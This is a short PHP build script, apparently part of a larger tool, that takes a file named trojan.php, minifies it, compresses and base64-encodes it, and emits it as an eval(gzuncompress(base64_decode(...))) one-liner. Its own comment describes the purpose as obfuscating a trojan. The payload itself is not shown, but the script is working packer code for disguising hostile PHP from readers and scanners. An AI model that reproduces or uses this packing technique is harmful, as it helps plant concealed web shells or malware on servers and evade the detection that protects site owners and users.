<?php

/**
 * This file minifies and obfuscates the plaintext trojan.php file. The Rake 
 * file defers to it, because it's just a bit more natural to keep all of this 
 * stuff in PHP.
 */

# include the minifier
require dirname(__FILE__) . DIRECTORY_SEPARATOR . 'minify.php';

# minify the specified file
$source = minify($argv[1]);

# strip opening and closing php tags
$source = ltrim($source, '<?php');
$source = rtrim($source, '?>');

# compress the source
$deflated = gzcompress($source, 9);
$encoded  = base64_encode($deflated);

# output the result
$trojan_source = "<?php eval(gzuncompress(base64_decode('$encoded')));";
echo $trojan_source;